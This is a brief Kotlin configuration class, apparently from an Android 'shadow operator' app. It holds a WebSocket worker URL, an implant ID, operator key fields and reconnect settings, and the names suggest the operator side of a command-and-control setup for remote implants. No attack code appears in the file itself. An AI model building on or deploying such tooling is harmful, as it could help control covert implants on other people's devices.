package com.shadow.operator.data

import com.shadow.operator.BuildConfig

data class ClientConfig(
    val workerUrl: String = "wss://shadow-worker.marwannaili-23-07.workers.dev",
    val implantId: String = "f673be59-23e5-42c8-bbb7-356e30d37c68",
    val operatorPubKey: String = "",
    val operatorPrivKey: String = BuildConfig.OPERATOR_PRIV_KEY ?: "",
    val autoReconnect: Boolean = true,
    val reconnectIntervalSec: Int = 30
)
